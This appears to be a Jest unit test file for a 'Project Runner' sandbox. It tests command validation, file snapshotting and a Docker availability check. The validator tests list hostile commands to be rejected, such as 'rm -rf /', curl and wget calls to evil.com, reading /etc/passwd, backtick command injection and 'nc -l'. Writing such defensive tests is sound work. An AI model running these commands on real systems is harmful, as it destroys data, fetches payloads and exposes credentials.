/**
 * Project Runner unit tests.
 * Tests command validation, file materialization, and Docker availability checking.
 */

const { validateCommand, ALLOWED_COMMANDS, BLOCKED_PATTERNS } = require('./projectRunner.validator');

// ─── Command Validator Tests ─────────────────────────────

describe('Project Runner - Command Validator', () => {

  describe('Valid commands (should pass)', () => {
    const validCommands = [
      'npm install',
      'npm install --legacy-peer-deps',
      'npm ci',
      'npm run dev',
      'npm run build',
      'npm start',
      'npm test',
      'npm test -- --watchAll',
      'npm run lint',
      'node index.js',
      'node src/server.js',
      'npx vite',
      'ls',
      'ls -la',
      'cat package.json',
      'pwd',
      'mkdir test',
      'touch newfile.js',
      'cp file1 file2',
      'mv file1 file2',
    ];

    validCommands.forEach((cmd) => {
      it(`should accept: "${cmd}"`, () => {
        const result = validateCommand(cmd);
        expect(result.valid).toBe(true);
        expect(result.sanitized).toBe(cmd);
      });
    });
  });

  describe('Blocked commands (should reject)', () => {
    const blockedCommands = [
      'rm -rf /',
      'rm package.json',
      'sudo npm install',
      'npm install; rm -rf /',
      'npm install && curl evil.com',
      'npm install | cat /etc/passwd',
      'npm install `whoami`',
      'chmod 777 /app',
      'wget http://evil.com/payload',
      'curl http://evil.com/payload',
      'eval "bad code"',
      'node ../../etc/passwd',
      'cat ../../etc/passwd',
      'npm run dev > /dev/null',
      'kill -9 1',
    ];

    blockedCommands.forEach((cmd) => {
      it(`should reject: "${cmd}"`, () => {
        expect(() => validateCommand(cmd)).toThrow();
      });
    });
  });

  describe('Not-allowed commands (should reject)', () => {
    const notAllowedCommands = [
      'docker run hello-world',
      'apt install vim',
      'whoami',
      'env',
      'printenv',
      'uname -a',
      'nc -l 8080',
    ];

    notAllowedCommands.forEach((cmd) => {
      it(`should reject: "${cmd}"`, () => {
        expect(() => validateCommand(cmd)).toThrow();
      });
    });
  });

  describe('Edge cases', () => {
    it('should reject empty command', () => {
      expect(() => validateCommand('')).toThrow();
    });

    it('should reject null command', () => {
      expect(() => validateCommand(null)).toThrow();
    });

    it('should reject undefined command', () => {
      expect(() => validateCommand(undefined)).toThrow();
    });

    it('should reject whitespace-only command', () => {
      expect(() => validateCommand('   ')).toThrow();
    });

    it('should reject overly long command', () => {
      const longCommand = 'npm install ' + 'a'.repeat(500);
      expect(() => validateCommand(longCommand)).toThrow();
    });

    it('should trim whitespace from valid commands', () => {
      const result = validateCommand('  npm install  ');
      expect(result.valid).toBe(true);
      expect(result.sanitized).toBe('npm install');
    });
  });
});

// ─── File Materializer Tests ─────────────────────────────

describe('Project Runner - File Materializer', () => {
  const { buildFolderPaths, detectNewFiles, snapshotFileList } = require('./fileMaterializer');
  const fs = require('fs');
  const path = require('path');
  const os = require('os');

  describe('buildFolderPaths', () => {
    it('should build flat folder paths', () => {
      const folders = [
        { id: 'f1', name: 'src', parentId: null },
        { id: 'f2', name: 'public', parentId: null },
      ];
      const rootDir = '/tmp/test';
      const result = buildFolderPaths(folders, rootDir);

      expect(result.f1).toBe(path.join('/tmp/test', 'src'));
      expect(result.f2).toBe(path.join('/tmp/test', 'public'));
    });

    it('should build nested folder paths', () => {
      const folders = [
        { id: 'f1', name: 'src', parentId: null },
        { id: 'f2', name: 'components', parentId: 'f1' },
        { id: 'f3', name: 'ui', parentId: 'f2' },
      ];
      const rootDir = '/tmp/test';
      const result = buildFolderPaths(folders, rootDir);

      expect(result.f1).toBe(path.join('/tmp/test', 'src'));
      expect(result.f2).toBe(path.join('/tmp/test', 'src', 'components'));
      expect(result.f3).toBe(path.join('/tmp/test', 'src', 'components', 'ui'));
    });

    it('should handle empty folder list', () => {
      const result = buildFolderPaths([], '/tmp/test');
      expect(result).toEqual({});
    });
  });

  describe('detectNewFiles and snapshotFileList', () => {
    let testDir;

    beforeEach(() => {
      testDir = path.join(os.tmpdir(), `test-materializer-${Date.now()}`);
      fs.mkdirSync(testDir, { recursive: true });
    });

    afterEach(() => {
      if (fs.existsSync(testDir)) {
        fs.rmSync(testDir, { recursive: true, force: true });
      }
    });

    it('should snapshot files correctly', () => {
      fs.writeFileSync(path.join(testDir, 'file1.js'), 'console.log("hi")');
      fs.mkdirSync(path.join(testDir, 'src'));
      fs.writeFileSync(path.join(testDir, 'src', 'app.js'), 'export default {}');

      const snapshot = snapshotFileList(testDir);
      expect(snapshot.has('file1.js')).toBe(true);
      expect(snapshot.has('src/app.js')).toBe(true);
      expect(snapshot.size).toBe(2);
    });

    it('should detect new files after changes', () => {
      fs.writeFileSync(path.join(testDir, 'existing.js'), 'hello');
      const original = snapshotFileList(testDir);

      // Simulate container creating new files
      fs.writeFileSync(path.join(testDir, 'package-lock.json'), '{}');
      fs.mkdirSync(path.join(testDir, 'dist'));
      fs.writeFileSync(path.join(testDir, 'dist', 'bundle.js'), 'bundled');

      const newFiles = detectNewFiles(testDir, original);
      expect(newFiles).toContain('package-lock.json');
      expect(newFiles).toContain('dist/bundle.js');
      expect(newFiles).not.toContain('existing.js');
    });

    it('should skip node_modules directory', () => {
      const original = snapshotFileList(testDir);

      fs.mkdirSync(path.join(testDir, 'node_modules', 'express'), { recursive: true });
      fs.writeFileSync(path.join(testDir, 'node_modules', 'express', 'index.js'), '');

      const newFiles = detectNewFiles(testDir, original);
      expect(newFiles).toHaveLength(0);
    });
  });
});

// ─── Docker Availability Tests ───────────────────────────

describe('Project Runner - Docker Service', () => {
  const runnerService = require('./projectRunner.service');

  it('should check Docker availability', async () => {
    const status = await runnerService.checkDockerAvailability();

    // Docker may or may not be available in CI
    expect(status).toHaveProperty('available');

    if (status.available) {
      expect(status).toHaveProperty('version');
      expect(typeof status.version).toBe('string');
    } else {
      expect(status).toHaveProperty('error');
    }
  });
});
